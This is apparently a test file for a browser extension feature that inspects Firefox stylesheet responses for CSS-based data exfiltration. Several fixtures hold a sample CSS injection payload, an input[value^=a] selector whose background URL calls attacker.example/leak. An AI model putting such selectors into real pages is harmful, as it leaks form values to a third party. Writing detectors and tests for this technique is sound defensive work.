import { describe, expect, it, vi } from "vitest";
import { DEFAULT_SITE_POLICY, EMPTY_ANALYSIS_SUMMARY } from "../../../src/shared/constants";
import { inspectFirefoxStylesheetResponse, type FilterResponseData, type FirefoxWebRequest, type WebRequestDetails } from "../../../src/browser/firefox/enhancedStylesheetInspection";
import type { AnalysisSummary } from "../../../src/shared/types";

const TEST_NOW_MS = 1_700_000_000_000;
const LATER_TEST_NOW_MS = 1_700_000_000_500;

function enabledPolicy() {
  return {
    ...DEFAULT_SITE_POLICY,
    compatibility: { ...DEFAULT_SITE_POLICY.compatibility, enableFirefoxEnhancedMode: true },
  };
}

function details(overrides: Partial<WebRequestDetails> = {}): WebRequestDetails {
  return {
    requestId: "request-1",
    tabId: 4,
    frameId: 0,
    parentFrameId: -1,
    url: "https://cdn.example/app.css",
    documentUrl: "https://app.example/page",
    ...overrides,
  };
}

function makeFilter(): FilterResponseData & { written: ArrayBuffer[]; closed: boolean; disconnected: boolean } {
  return {
    ondata: null,
    onstop: null,
    onerror: null,
    written: [],
    closed: false,
    disconnected: false,
    write(data: ArrayBuffer) { this.written.push(data); },
    close() { this.closed = true; },
    disconnect() { this.disconnected = true; },
  };
}

function encode(text: string): ArrayBuffer {
  const bytes = new TextEncoder().encode(text);
  return bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength);
}

describe("Firefox enhanced stylesheet response inspection", () => {
  it("does nothing when the policy disables enhanced inspection", () => {
    const filter = makeFilter();
    const webRequest: FirefoxWebRequest = { filterResponseData: vi.fn(() => filter) };
    const result = inspectFirefoxStylesheetResponse(webRequest, details(), DEFAULT_SITE_POLICY);
    expect(result).toBe(false);
    expect(webRequest.filterResponseData).not.toHaveBeenCalled();
  });

  it("degrades safely when response filtering is unavailable", () => {
    expect(inspectFirefoxStylesheetResponse({}, details(), enabledPolicy())).toBe(false);
    expect(inspectFirefoxStylesheetResponse({ filterResponseData: () => undefined }, details(), enabledPolicy())).toBe(false);
  });

  it("passes response chunks through unchanged and closes the filter", () => {
    const filter = makeFilter();
    const webRequest: FirefoxWebRequest = { filterResponseData: () => filter };
    const saveFrameReport = vi.fn();
    const analyze = vi.fn((): AnalysisSummary => ({ ...EMPTY_ANALYSIS_SUMMARY, findings: [] }));

    expect(inspectFirefoxStylesheetResponse(webRequest, details(), enabledPolicy(), { analyze, saveFrameReport, now: () => 10, maxRetainedBytes: 512_000 })).toBe(true);
    const chunk = encode("body{color:red}");
    filter.ondata?.({ data: chunk });
    filter.onstop?.();

    expect(filter.written).toEqual([chunk]);
    expect(filter.closed).toBe(true);
    expect(saveFrameReport).not.toHaveBeenCalled();
  });

  it("saves findings from inspected stylesheet responses", () => {
    const filter = makeFilter();
    const webRequest: FirefoxWebRequest = { filterResponseData: () => filter };
    const saveFrameReport = vi.fn();
    const findingSummary: AnalysisSummary = {
      ...EMPTY_ANALYSIS_SUMMARY,
      findings: [{
        id: "finding-1",
        severity: "high",
        confidence: 90,
        pageUrl: "https://app.example/page",
        pageOrigin: "https://app.example",
        frameUrl: "https://app.example/page",
        frameOrigin: "https://app.example",
        sourceKind: "stylesheet",
        sourceUrl: "https://cdn.example/app.css",
        sourceOrigin: "https://cdn.example",
        selector: "input[value^=a]",
        property: "background",
        destinationOrigin: "https://attacker.example",
        destinationUrl: "https://attacker.example/leak",
        action: "logged",
        state: "analysis.complete",
        reasons: ["selector.attribute.prefix_match", "sink.remote_url", "url.cross_origin"],
        timestamp: 10,
        details: "test finding",
      }],
    };
    const analyze = vi.fn(() => findingSummary);

    inspectFirefoxStylesheetResponse(webRequest, details(), enabledPolicy(), { analyze, saveFrameReport, now: () => TEST_NOW_MS, maxRetainedBytes: 512_000 });
    filter.ondata?.({ data: encode("input[value^=a]{background:url(https://attacker.example/leak)}") });
    filter.onstop?.();

    expect(analyze).toHaveBeenCalledWith(expect.objectContaining({ sourceUrl: "https://cdn.example/app.css" }));
    expect(saveFrameReport).toHaveBeenCalledWith(4, "https://app.example/page", expect.objectContaining({
      frameId: 0,
      parentFrameId: -1,
      frameUrl: "https://app.example/page",
      frameOrigin: "https://app.example",
      summary: expect.objectContaining({
        ...findingSummary,
        startedAt: TEST_NOW_MS,
        finishedAt: TEST_NOW_MS,
      }),
      updatedAt: TEST_NOW_MS,
    }));
  });


  it("bounds retained response bytes while preserving pass-through", () => {
    const filter = makeFilter();
    const webRequest: FirefoxWebRequest = { filterResponseData: () => filter };
    const saveFrameReport = vi.fn();
    const analyze = vi.fn((): AnalysisSummary => ({ ...EMPTY_ANALYSIS_SUMMARY, findings: [] }));

    inspectFirefoxStylesheetResponse(webRequest, details(), enabledPolicy(), { analyze, saveFrameReport, now: () => LATER_TEST_NOW_MS, maxRetainedBytes: 12 });
    const first = encode("body{color:red}");
    const second = encode("input[value^=a]{background:url(https://attacker.example/leak)}");
    filter.ondata?.({ data: first });
    filter.ondata?.({ data: second });
    filter.onstop?.();

    expect(filter.written).toEqual([first, second]);
    expect(analyze).toHaveBeenCalledWith(expect.objectContaining({ cssText: "body{color:r" }));
    expect(saveFrameReport).toHaveBeenCalledWith(4, "https://app.example/page", expect.objectContaining({
      summary: expect.objectContaining({
        state: "analysis.skipped.performance_budget",
        partialStylesheets: 1,
      }),
      updatedAt: LATER_TEST_NOW_MS,
    }));
  });

  it("disconnects and suppresses analysis after filter errors", () => {
    const filter = makeFilter();
    const saveFrameReport = vi.fn();
    const analyze = vi.fn((): AnalysisSummary => ({ ...EMPTY_ANALYSIS_SUMMARY, findings: [] }));

    inspectFirefoxStylesheetResponse({ filterResponseData: () => filter }, details(), enabledPolicy(), { analyze, saveFrameReport, now: () => TEST_NOW_MS, maxRetainedBytes: 512_000 });
    filter.onerror?.();
    expect(filter.disconnected).toBe(true);

    filter.ondata?.({ data: encode("input[value^=a]{background:url(https://attacker.example/leak)}") });
    expect(() => filter.onstop?.()).not.toThrow();
    expect(analyze).not.toHaveBeenCalled();
    expect(saveFrameReport).not.toHaveBeenCalled();
  });

  it("disconnects and suppresses analysis when filter writes fail", () => {
    const filter = makeFilter();
    const writeFailure = new Error("write failed");
    filter.write = () => { throw writeFailure; };
    const saveFrameReport = vi.fn();
    const analyze = vi.fn((): AnalysisSummary => ({ ...EMPTY_ANALYSIS_SUMMARY, findings: [] }));

    inspectFirefoxStylesheetResponse({ filterResponseData: () => filter }, details(), enabledPolicy(), { analyze, saveFrameReport, now: () => TEST_NOW_MS, maxRetainedBytes: 512_000 });
    expect(() => filter.ondata?.({ data: encode("body{color:red}") })).not.toThrow();
    expect(filter.disconnected).toBe(true);
    filter.onstop?.();
    expect(analyze).not.toHaveBeenCalled();
    expect(saveFrameReport).not.toHaveBeenCalled();
  });

  it("contains close failures after successful pass-through", () => {
    const filter = makeFilter();
    filter.close = () => { throw new Error("close failed"); };
    const saveFrameReport = vi.fn();
    const analyze = vi.fn((): AnalysisSummary => ({ ...EMPTY_ANALYSIS_SUMMARY, findings: [] }));

    inspectFirefoxStylesheetResponse({ filterResponseData: () => filter }, details(), enabledPolicy(), { analyze, saveFrameReport, now: () => TEST_NOW_MS, maxRetainedBytes: 512_000 });
    filter.ondata?.({ data: encode("body{color:red}") });
    expect(() => filter.onstop?.()).not.toThrow();
    expect(filter.disconnected).toBe(true);
  });

  it("contains analyzer failures after successful pass-through", () => {
    const filter = makeFilter();
    const saveFrameReport = vi.fn();
    const analyze = vi.fn(() => { throw new Error("analyzer failed"); });

    inspectFirefoxStylesheetResponse({ filterResponseData: () => filter }, details(), enabledPolicy(), { analyze, saveFrameReport, now: () => TEST_NOW_MS, maxRetainedBytes: 512_000 });
    filter.ondata?.({ data: encode("input[value^=a]{background:url(https://attacker.example/leak)}") });
    expect(() => filter.onstop?.()).not.toThrow();
    expect(saveFrameReport).toHaveBeenCalledWith(4, "https://app.example/page", expect.objectContaining({
      summary: expect.objectContaining({ state: "analysis.skipped.performance_budget", partialStylesheets: 1 }),
      updatedAt: TEST_NOW_MS,
    }));
  });
});
